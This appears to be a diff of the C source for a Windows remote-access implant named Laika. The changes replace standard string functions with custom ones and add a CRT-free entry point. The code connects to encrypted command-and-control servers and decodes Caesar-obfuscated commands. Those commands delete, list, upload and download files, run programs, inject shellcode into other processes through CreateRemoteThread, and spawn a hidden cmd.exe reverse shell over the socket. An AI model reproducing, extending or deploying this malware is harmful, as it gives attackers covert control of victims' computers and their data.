@@ -3,7 +3,7 @@
 
 #include <Windows.h>
 #include <wininet.h>
-#include <shlobj_core.h>
+//#include <shlobj_core.h>
 #include <stdio.h>
 
 #include "utils.h"
@@ -124,7 +124,7 @@ DWORD WINAPI watch_process(LPVOID lpParameter) {
 }
 
 void SendShellEndedSignal(SOCKET sock) {
-	if (Api.send(sock, "Qfnpf?%xjxxnts%jsiji", strlen("Qfnpf?%xjxxnts%jsiji"), 0) < 0) //Laika: session ended
+	if (Api.send(sock, "Qfnpf?%xjxxnts%jsiji", strlen_("Qfnpf?%xjxxnts%jsiji"), 0) < 0) //Laika: session ended
 	{
 		//send failed
 	}
@@ -132,13 +132,14 @@ void SendShellEndedSignal(SOCKET sock) {
 
 int serv = -1;
 HANDLE _crt_heap = 0;
+
 int main(void) {
 	InitApis();
 
 	_crt_heap = Api.HeapCreate(0, 0, 0);
 
 	wchar_t wtext[20];
-	mbstowcs_(wtext, CAESAR_DECRYPT("hri3j}j"), strlen(CAESAR_DECRYPT("hri3j}j")) + 1);//Plus null
+	mbstowcs_(wtext, CAESAR_DECRYPT("hri3j}j"), strlen_(CAESAR_DECRYPT("hri3j}j")) + 1);//Plus null
 	LPWSTR cmd_char = wtext;
 
 	int sock = 0;
@@ -167,9 +168,9 @@ retry:
 	//on fait une copie de l'ip chiffrée, puis on la free_
 	//ça évite qu'elle reste dans la mémoire trop longtemps
 	//ça évite aussi qu'on utilise CAESAR_DECRYPT sur une ip déjà décryptée
-	size_t len = strlen(fallback_servers[serv]);
+	size_t len = strlen_(fallback_servers[serv]);
 	char* Tmp = Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, len + 1);
-	strcpy(Tmp, fallback_servers[serv]);
+	strcpy_(Tmp, fallback_servers[serv]);
 
 	server.sin_addr.s_addr = Api.inet_addr(CAESAR_DECRYPT(Tmp));
 
@@ -206,7 +207,7 @@ retry:
 			goto retry;
 		}
 
-		if (strncmp_(server_reply, "ijqdknqj", strlen("ijqdknqj")) == 0) { //del_file
+		if (strncmp_(server_reply, "ijqdknqj", strlen_("ijqdknqj")) == 0) { //del_file
 			char* path = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, MAX_PATH);
 
 			//Receive a reply from the server
@@ -223,7 +224,7 @@ retry:
 			Api.Heapfree_(_crt_heap, 0, path);
 		}
 
-		if (strncmp_(server_reply, "ijqdinw", strlen("ijqdinw")) == 0) { //del_dir
+		if (strncmp_(server_reply, "ijqdinw", strlen_("ijqdinw")) == 0) { //del_dir
 			char* path = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, MAX_PATH);
 
 			//Receive a reply from the server
@@ -243,7 +244,7 @@ retry:
 			Api.Heapfree_(_crt_heap, 0, path);
 		}
 
-		if (strncmp_(server_reply, "ljydtgodnskt", strlen("ljydtgodnskt")) == 0) { //get_obj_info
+		if (strncmp_(server_reply, "ljydtgodnskt", strlen_("ljydtgodnskt")) == 0) { //get_obj_info
 			char* path = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, MAX_PATH);
 
 			//Receive a reply from the server
@@ -263,12 +264,12 @@ retry:
 			}
 		}
 
-		if (strncmp_(server_reply, "ljydiwn{jx", strlen("ljydiwn{jx")) == 0) { //get_drives
+		if (strncmp_(server_reply, "ljydiwn{jx", strlen_("ljydiwn{jx")) == 0) { //get_drives
 			char* drives = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, MAX_PATH);
 
 			get_drives_list(drives);
 
-			if (Api.send(sock, drives, strlen(drives), 0) < 0) {
+			if (Api.send(sock, drives, strlen_(drives), 0) < 0) {
 				//send failed
 				Api.Heapfree_(_crt_heap, 0, drives);
 				Sleep_(Sleep_TIME);
@@ -278,7 +279,7 @@ retry:
 			Api.Heapfree_(_crt_heap, 0, drives);
 		}
 
-		if (strncmp_(server_reply, "j}jhzyj", strlen("j}jhzyj")) == 0) { //execute
+		if (strncmp_(server_reply, "j}jhzyj", strlen_("j}jhzyj")) == 0) { //execute
 			char* path = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, MAX_PATH);
 			STARTUPINFOA si;
 			PROCESS_INFORMATION pi;
@@ -310,7 +311,7 @@ retry:
 		}
 
 #ifdef SHELLCODE
-		if (strncmp_(server_reply, "nsojhy", strlen("nsojhy")) == 0) { //inject
+		if (strncmp_(server_reply, "nsojhy", strlen_("nsojhy")) == 0) { //inject
 			char* arch = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, 2);
 
 			if (Api.recv(sock, arch, 2, 0) <= 0) {
@@ -324,13 +325,13 @@ retry:
 			size_t fsize = 0;
 			char *file = upload_file_to_mem(sock, &fsize);
 			if (file == NULL) {
-				Api.send(sock, "fail", strlen("fail"), 0);
+				Api.send(sock, "fail", strlen_("fail"), 0);
 				Sleep_(Sleep_TIME);
 				goto retry;
 			}
 
 			HANDLE proc = NULL;
-			if (strncmp_(arch, "32", strlen("32")) == 0) {
+			if (strncmp_(arch, "32", strlen_("32")) == 0) {
 				proc = FindProcessByArch(L"x86");
 			}
 			else {
@@ -340,7 +341,7 @@ retry:
 			Api.Heapfree_(_crt_heap, 0, arch);
 
 			if (proc == NULL) {
-				Api.send(sock, "fail", strlen("fail"), 0);
+				Api.send(sock, "fail", strlen_("fail"), 0);
 				Api.Heapfree_(_crt_heap, 0, file);
 				Sleep_(Sleep_TIME);
 				goto retry;
@@ -348,7 +349,7 @@ retry:
 
 			LPVOID addr = Api.VirtualAllocEx(proc, NULL, fsize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 			if (addr == NULL) {
-				Api.send(sock, "fail", strlen("fail"), 0);
+				Api.send(sock, "fail", strlen_("fail"), 0);
 				Api.Heapfree_(_crt_heap, 0, file);
 				Api.CloseHandle(proc);
 				Sleep_(Sleep_TIME);
@@ -356,7 +357,7 @@ retry:
 			}
 
 			if (Api.WriteProcessMemory(proc, addr, file, fsize, NULL) == 0) {
-				Api.send(sock, "fail", strlen("fail"), 0);
+				Api.send(sock, "fail", strlen_("fail"), 0);
 				Api.Heapfree_(_crt_heap, 0, file);
 				Api.CloseHandle(proc);
 				Sleep_(Sleep_TIME);
@@ -365,7 +366,7 @@ retry:
 
 			HANDLE hThread = Api.CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
 			if (hThread == NULL) {
-				Api.send(sock, "fail", strlen("fail"), 0);
+				Api.send(sock, "fail", strlen_("fail"), 0);
 				Api.Heapfree_(_crt_heap, 0, file);
 				Api.CloseHandle(proc);
 				Sleep_(Sleep_TIME);
@@ -375,10 +376,10 @@ retry:
 			Api.Heapfree_(_crt_heap, 0, file);
 			Api.CloseHandle(proc);
 			Api.CloseHandle(hThread);
-			Api.send(sock, "ok", strlen("ok"), 0);
+			Api.send(sock, "ok", strlen_("ok"), 0);
 		}
 #endif
-		if (strncmp_(server_reply, "ljydknqjdqnxy", strlen("ljydknqjdqnxy")) == 0) { //get_file_list
+		if (strncmp_(server_reply, "ljydknqjdqnxy", strlen_("ljydknqjdqnxy")) == 0) { //get_file_list
 			char* file_list = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, BUFFER_SIZE);
 			char* path = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, MAX_PATH);
 
@@ -403,7 +404,7 @@ retry:
 			}
 
 
-			if (Api.send(sock, file_list, strlen(file_list), 0) < 0) {
+			if (Api.send(sock, file_list, strlen_(file_list), 0) < 0) {
 				//send failed
 				Api.Heapfree_(_crt_heap, 0, file_list);
 				Api.Heapfree_(_crt_heap, 0, path);
@@ -414,7 +415,7 @@ retry:
 			Api.Heapfree_(_crt_heap, 0, path);
 		}
 
-		if (strncmp_(server_reply, "it|sqtfidknqj", strlen("it|sqtfidknqj")) == 0) { //download_file
+		if (strncmp_(server_reply, "it|sqtfidknqj", strlen_("it|sqtfidknqj")) == 0) { //download_file
 			char* path = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, MAX_PATH);
 
 			//Receive a reply from the server
@@ -441,7 +442,7 @@ retry:
 			}
 		}
 
-		if (strncmp_(server_reply, "zuqtfidknqj", strlen("zuqtfidknqj")) == 0) { //upload_file
+		if (strncmp_(server_reply, "zuqtfidknqj", strlen_("zuqtfidknqj")) == 0) { //upload_file
 			char* path = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, MAX_PATH);
 
 			//Receive a reply from the server
@@ -470,7 +471,7 @@ retry:
 			Api.Heapfree_(_crt_heap, 0, path);
 		}
 
-		if (strncmp_(server_reply, "xmjqq", strlen("xmjqq")) == 0) { //shell
+		if (strncmp_(server_reply, "xmjqq", strlen_("xmjqq")) == 0) { //shell
 			started = 0;
 			// Set the socket as standard output and error
 			SECURITY_ATTRIBUTES sa;
@@ -478,14 +479,14 @@ retry:
 			sa.bInheritHandle = TRUE;
 			sa.lpSecurityDescriptor = NULL;
 			if (!Api.CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &sa, 0)) {
-				Api.send(sock, "fail", strlen("fail"), 0);
+				Api.send(sock, "fail", strlen_("fail"), 0);
 				SendShellEndedSignal(sock);
 				Sleep_(Sleep_TIME);
 				goto retry;
 			}
 			if (!Api.CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &sa, 0)) {
 				Api.CloseHandle(g_hChildStd_IN_Rd);
-				Api.send(sock, "fail", strlen("fail"), 0);
+				Api.send(sock, "fail", strlen_("fail"), 0);
 				SendShellEndedSignal(sock);
 				Sleep_(Sleep_TIME);
 				goto retry;
@@ -497,7 +498,7 @@ retry:
 			if (hThread == NULL || hThread2 == NULL) {
 				Api.CloseHandle(g_hChildStd_OUT_Wr);
 				Api.CloseHandle(g_hChildStd_IN_Rd);
-				Api.send(sock, "fail", strlen("fail"), 0);
+				Api.send(sock, "fail", strlen_("fail"), 0);
 				SendShellEndedSignal(sock);
 				Sleep_(Sleep_TIME);
 				goto retry;
@@ -516,7 +517,7 @@ retry:
 			memset_(&pi, 0, sizeof(PROCESS_INFORMATION));
 
 			if (!Api.CreateProcessW(NULL, cmd_char, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { //cmd.exe
-				Api.send(sock, "fail", strlen("fail"), 0);
+				Api.send(sock, "fail", strlen_("fail"), 0);
 				SendShellEndedSignal(sock);
 				Api.CloseHandle(g_hChildStd_OUT_Wr);
 				Api.CloseHandle(g_hChildStd_IN_Rd);
@@ -594,11 +595,11 @@ retry:
 			}
 		}
 
-		if (strncmp_(server_reply, "ufxr", strlen("ufxr")) == 0) { //pasm
+		if (strncmp_(server_reply, "ufxr", strlen_("ufxr")) == 0) { //pasm
 			size_t fsize = 0;
 			char* file = upload_file_to_mem(sock, &fsize);
 			if (file == NULL) {
-				Api.send(sock, "fail", strlen("fail"), 0);
+				Api.send(sock, "fail", strlen_("fail"), 0);
 				Sleep_(Sleep_TIME);
 				goto retry;
 			}
@@ -606,7 +607,7 @@ retry:
 			int line_count = 0;
 			char** lines = split_lines(file, &line_count);
 			if (lines == NULL) {
-				Api.send(sock, "fail", strlen("fail"), 0);
+				Api.send(sock, "fail", strlen_("fail"), 0);
 				Api.Heapfree_(_crt_heap, 0, file);
 				Sleep_(Sleep_TIME);
 				goto retry;
@@ -614,7 +615,7 @@ retry:
 
 			pasm_run_script(NULL, lines, line_count, sock);
 
-			Api.send(sock, "Qfnpf?%jsi%tk%xhwnuy", strlen("Qfnpf?%jsi%tk%xhwnuy"), 0); //Laika: end of script
+			Api.send(sock, "Qfnpf?%jsi%tk%xhwnuy", strlen_("Qfnpf?%jsi%tk%xhwnuy"), 0); //Laika: end of script
 			Api.Heapfree_(_crt_heap, 0, file);
 			if (lines != NULL)
 				Api.Heapfree_(_crt_heap, 0, lines);
@@ -626,6 +627,11 @@ retry:
 	free_Apis();
 	*/
 	return 0;
+}
+
+extern void mainCRTStartup(void);
+void mainCRTStartup(void) {
+	main();
 }
 
 /*
